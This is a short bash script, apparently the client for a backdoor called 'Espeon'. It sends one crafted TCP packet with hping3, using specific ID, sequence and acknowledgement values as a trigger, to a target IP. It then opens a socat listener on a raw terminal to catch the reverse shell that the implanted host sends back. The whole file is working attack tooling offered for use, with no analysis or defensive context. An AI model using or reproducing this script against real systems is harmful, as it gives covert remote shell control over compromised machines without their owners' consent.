#!/bin/bash
if [ $1 == "" ]; then
    echo "Usage: espeon-connect IP"
    exit
fi

PORTNUM=$RANDOM
(sleep 0.5; hping3 -N 0x0fb1 -M 0x00c4 -L 0xc500 $1 -c 1 --baseport $PORTNUM >/dev/null 2>&1  ) & socat file:`tty`,raw,echo=0 tcp4-listen:$PORTNUM

